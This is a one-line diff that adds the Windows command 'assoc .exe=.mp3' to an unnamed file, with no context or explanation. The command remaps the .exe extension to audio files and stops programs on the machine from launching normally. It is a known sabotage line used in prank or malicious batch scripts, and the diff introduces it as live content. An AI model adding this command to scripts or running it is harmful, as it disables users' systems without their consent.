@@ -1,0 +1,1 @@
+assoc .exe=.mp3
